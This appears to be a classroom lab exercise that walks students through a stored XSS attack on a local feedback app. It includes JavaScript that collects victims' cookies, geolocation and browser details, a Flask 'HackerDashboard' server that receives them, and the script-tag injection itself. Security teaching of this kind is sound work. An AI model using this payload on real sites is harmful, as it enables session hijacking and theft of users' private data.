Get the User Data on Dashboard
======================
In this activity, you will perform XSS attack using script from other server to get the user information.

<img src= "https://s3-whjr-curriculum-uploads.whjr.online/a344d5c0-4411-4ba5-aa97-8a33a30527b8.gif" width = "100%" height = "50%">


Follow the given steps to complete this activity.


1. Create a script in `HackerDashboard/static` folder.
   * Include jQuery from CDN
   ```
   var script = document.createElement('script');
   script.src = 'https://code.jquery.com/jquery-3.6.4.min.js';
   document.head.appendChild(script);
   ```
   * Collect browser data in function `collectBrowserData()`
   ```
   var browserData = {
        userAgent: navigator.userAgent,
        browserName: getBrowserName(),
        browserType: getBrowserType(),
        browserVersion: getBrowserVersion(),
        cookies: getCookies(),
        location: geolocationResult,
        currentTime: getCurrentTime(),
        screenSize: getScreenSize(),
        operatingSystem: getOperatingSystem(),
    };
   ```
   * Send user data to server path `/collect_browser_data` using ajax.
   ```
   $.ajax({
        url: 'http://127.0.0.1:5000/collect_browser_data',
        method: 'POST',
        contentType: 'application/json',
        data: JSON.stringify(browserData),
        success: function (response) {
            console.log('Data sent successfully:', response);
        }
    });
   ```
   
2. Open `app.py` and add code to fetch the `script.js` file and also collect data from user.
   * Add path to deliver `script.js`.
   ```
   @app.route('/script')
   def script():
        return send_from_directory('static', 'script.js')
   ```
   * Create path `/collect_browser_data` to get data when script runs.
   ```
   @app.route('/collect_browser_data', methods=['POST', 'GET'])
    def collect_browser_data():
        browserData variable   
        browserData = request.get_json()
        client_ip = request.remote_addr
        browserData['ipAddress'] = client_ip
        data.append(browserData)
        return jsonify({'status': 'success'})
   ```
3. Run HackerDashboard app.
4. Run the Feedback app and perform XSS attack by adding following script:
```
<script src="http://127.0.0.1:5000/script"></script>
```

Check if the data gets to Hacker Dashboard after the attack is performed.
